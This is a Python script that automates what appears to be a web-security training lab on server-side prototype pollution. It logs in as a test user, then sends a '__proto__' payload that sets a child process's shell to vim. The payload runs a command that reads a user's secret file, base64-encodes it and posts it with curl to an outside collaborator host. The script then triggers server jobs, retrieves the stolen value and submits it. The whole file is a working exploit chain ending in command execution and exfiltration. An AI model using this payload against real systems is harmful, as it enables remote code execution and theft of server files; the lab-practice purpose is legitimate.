import requests
import re
import time
import json
import base64
import sys


class LabSolver:
    def __init__(self, lab_url):
        # To solve this lab using this script you need first to load this extension into burp suite
        # https://github.com/ma4747gh/CollaboratorFetcher

        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.collaborator_id = None
        self.answer = None

    def get_csrf_token(self, endpoint):
        response = self.session.get(self.lab_url + endpoint)
        return re.search('name="csrf" value="(.*)"', response.text).group(1)

    def sign_in_as_wiener(self):
        data = {
            'csrf': self.get_csrf_token('login'),
            'username': 'wiener',
            'password': 'peter'
        }
        self.session.post(self.lab_url + 'login', json=data)

    def get_collaborator_id(self):
        self.session.get('http://localhost:8888/start?total-payloads=4')

        time.sleep(4)

        response = self.session.get('http://localhost:8888/get-payloads')

        self.collaborator_id = json.loads(response.text)['2']

    def read_carlos_secret(self):
        session_id = self.session.cookies.get('session')
        data = {
            'sessionId': session_id,
            '__proto__': {
                'shell': 'vim',
                'input': ':! cat /home/carlos/secret | base64 | curl -d @- https://{}\n'.format(self.collaborator_id)
            }
        }
        self.session.post(self.lab_url + 'my-account/change-address', json=data)

    def trigger_job(self):
        session_id = self.session.cookies.get('session')
        data = {
            'csrf': self.get_csrf_token('admin'),
            'sessionId': session_id,
            'tasks': ['db-cleanup', 'fs-cleanup']
        }
        self.session.post(self.lab_url + 'admin/jobs', json=data)

    def get_interactions(self):
        time.sleep(10)

        response = self.session.get('http://localhost:8888/get-interactions')
        interactions = json.loads(response.text)
        payload_interactions = {}
        for key, value in interactions.items():
            if self.collaborator_id.replace('.oastify.com', '') in key and 'http' in key:
                temp_response = base64.b64decode(value)
                if 'POST /' in temp_response.decode():
                    payload_interactions[key] = value

        data = list(payload_interactions.values())[0]
        body = base64.b64decode(data).decode().split('\r\n')[-1]
        self.answer = base64.b64decode(body)

    def submit_solution(self):
        data = {
            'answer': self.answer
        }
        self.session.post(self.lab_url + 'submitSolution', data=data)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.sign_in_as_wiener()
        self.get_collaborator_id()
        self.read_carlos_secret()
        self.trigger_job()
        self.get_interactions()
        self.submit_solution()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
